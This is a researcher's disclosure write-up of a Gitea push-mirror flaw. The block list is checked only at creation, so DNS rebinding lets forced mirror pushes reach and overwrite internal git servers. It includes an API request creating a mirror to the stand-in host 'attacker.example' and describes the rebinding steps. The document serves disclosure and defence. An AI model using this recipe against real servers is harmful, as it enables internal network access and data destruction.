# Gitea Guarded Three Doors and Forgot the Fourth

- **Source URL:** https://mayssare.medium.com/gitea-guarded-three-doors-and-forgot-the-fourth-e44d6e76e5e6
- **Fetched from:** https://mayssare.medium.com/gitea-guarded-three-doors-and-forgot-the-fourth-e44d6e76e5e6?source=rss-343ea0762f10------2
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/14947 (id 14947)
- **Method:** medium-rss-feed (full content:encoded) readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
- **Author/Published (RSS):** Mayssare / Tue, 13 Oct 2026 21:46:10 GMT

I’ve been going through open source projects lately, looking for bugs in software that real people run. This time it was **Gitea**, the self-hosted Git server a lot of teams keep their private code on.

**Gitea** can mirror a repository to another git server. You give it an address, and it pushes a copy there on a timer or on every commit. Admins can also set a block list so mirrors can’t be pointed at internal hosts. When you create a mirror, the address gets checked against that list.

I wanted to know what happens after that.

The answer is nothing. The check runs once, when the mirror is created. After that the saved address goes straight into git push on every sync, and git does its own **DNS** lookup, so whatever the **hostname** points to at that moment is where **Gitea** connects.

Here’s the setup:

```
POST /api/v1/repos/{owner}/{repo}/push_mirrors
{"remote_address": "http://attacker.example/repo.git", "sync_on_commit": true}
```
The **hostname** points at a normal public IP, so the check passes and the mirror gets created. Then I repoint the name at something inside the network. The next sync, **Gitea** pushes my repository to that machine. Any user can do this, because adding a push mirror only needs admin on a repo, and everyone is admin on the repos they create.

From there it runs on its own. The timer triggers it, and so does every commit. The push is --mirror --force, so any branch on the target that isn’t in my repo gets deleted and mine is written in its place. If an internal git service lets anyone push without logging in, a free account can overwrite its repositories.

What convinced me this was a mistake and not a design choice was the **LFS** code in the same function. When **LFS** is on, the **LFS** upload goes through a client that enforces the block list. So one sync opens two connections, and only one of them follows the rule. The plain git push sitting right next to it skips the check. **Pull mirrors re-check the address on every sync**. So the block list guards three doors: when a **mirror** is created, when a pull mirror syncs, and on the **LFS** upload. The plain git push is the fourth door, and nobody locked it.

I couldn’t test real **DNS** rebinding without running a **DNS** server I control, so I tested the closest thing. I created a mirror pointing at a local listener while the setting allowed it, switched the setting to blocked, and triggered a sync. The listener still got the connection. The same test on a pull mirror gets refused. That shows the sync never consults the policy, which is the whole bug. I’m not claiming a live attack on a production server.

It has limits too. Writing into an internal server only works if that server accepts unauthenticated pushes. And if the **LFS** server is on and the source repo contains an **LFS** object, the sync stops at the guarded **LFS** step before reaching the push. The attacker owns the source repo, so they just leave **LFS** objects out.

I reported it to the **Gitea** team on **August 24**. The fix landed on **September 15**, and the advisory went public on **October 6, 2026**.

Two other researchers, **thesmartshadow** and **manus-use**, had also found this and reported it. The **Gitea** team merged our reports into one, and the **CVE** credits all three of us. It was rated **High** and published as **CVE-2026-89430**, with the fix in **Gitea 28.0.0**. If you run **Gitea** and can’t upgrade yet, setting \[mirror\] ENABLED=false stops all mirror updates.

What I keep thinking about is how reasonable the creation check looks. It’s a real check, in the right place, and it works. It just answers “was this address fine when you added it?” when the question that matters is “is it fine right now?”

Credit to [**thesmartshadow**](https://github.com/thesmartshadow) and [**manus-use**](https://github.com/manus-use) for finding the same bug, and to [**TheFox0x7**](https://github.com/TheFox0x7), [**bircni**](https://github.com/bircni) and [**wxiaoguang**](https://github.com/wxiaoguang), who wrote the fix.
